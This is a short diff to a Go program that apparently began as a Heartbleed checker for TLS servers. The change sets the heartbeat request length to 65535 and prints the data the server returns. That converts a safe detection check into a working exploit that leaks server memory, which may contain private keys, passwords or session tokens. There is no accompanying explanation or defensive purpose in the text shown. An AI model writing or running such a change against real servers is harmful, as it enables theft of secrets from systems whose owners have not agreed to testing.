@@ -31,10 +31,11 @@ func main() {
 		os.Exit(0)
 	}()
 
-	_, _, err = c.Heartbeat(2, []byte{2})
+	_, data, err := c.Heartbeat(65535, []byte{2})
 	switch err {
 	case nil:
 		fmt.Printf("INSECURE - %s has the heartbeat extension enabled and is vulnerable\n", host)
+    fmt.Printf("Data: %s", data)
 		os.Exit(1)
 	case tls.ErrNoHeartbeat:
 		fmt.Printf("SECURE - %s does not have the heartbeat extension enabled\n", host)
